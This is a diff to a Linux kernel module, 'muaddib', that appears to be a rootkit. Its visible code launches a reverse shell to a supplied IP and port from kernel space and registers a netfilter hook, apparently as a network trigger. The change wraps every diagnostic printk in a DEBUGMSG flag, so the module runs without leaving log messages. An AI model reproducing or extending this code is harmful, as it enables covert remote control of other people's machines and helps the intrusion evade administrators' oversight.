@@ -37,7 +37,9 @@ void execute_reverse_shell(struct work_struct *work){
     strcat(exec, params->target_port);
 	strcat(exec, " ");
     strcat(exec, EXEC_P2);
+	#ifdef DEBUGMSG
     printk(KERN_INFO "muaddib: Starting reverse shell %s\n", exec);
+	#endif
 
     err = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
     if(err<0){
@@ -54,7 +56,9 @@ int start_reverse_shell(char* ip, char* port){
     int err;
     struct shell_params *params = kmalloc(sizeof(struct shell_params), GFP_KERNEL);
     if(!params){
+		#ifdef DEBUGMSG
         printk(KERN_INFO "muaddib: Error allocating memory\n");
+		#endif
         return 1;
     }
     params->target_ip = kstrdup(ip, GFP_KERNEL);
@@ -63,7 +67,9 @@ int start_reverse_shell(char* ip, char* port){
 
     err = schedule_work(&params->work);
     if(err<0){
+		#ifdef DEBUGMSG
         printk(KERN_INFO "muaddib: Error scheduling work of starting shell\n");
+		#endif
     }
     return err;
 
@@ -132,9 +138,13 @@ int register_netfilter_hook(void){
         err = nf_register_hook(&nfho);
     #endif
     if(err<0){
-        printk(KERN_INFO "muaddib: Error registering nf hook");
+		#ifdef DEBUGMSG
+		printk(KERN_INFO "muaddib: Error registering nf hook");
+		#endif
     }else{
+		#ifdef DEBUGMSG
         printk(KERN_INFO "muaddib: Registered nethook");
+		#endif
     }
 
     return err;
@@ -149,6 +159,8 @@ void unregister_netfilter_hook(void){
     #else
         nf_unregister_hook(&nfho);
     #endif
-    printk(KERN_INFO "muaddib: Unregistered nethook");
+	#ifdef DEBUGMSG
+    	printk(KERN_INFO "muaddib: Unregistered nethook");
+	#endif
 
 }
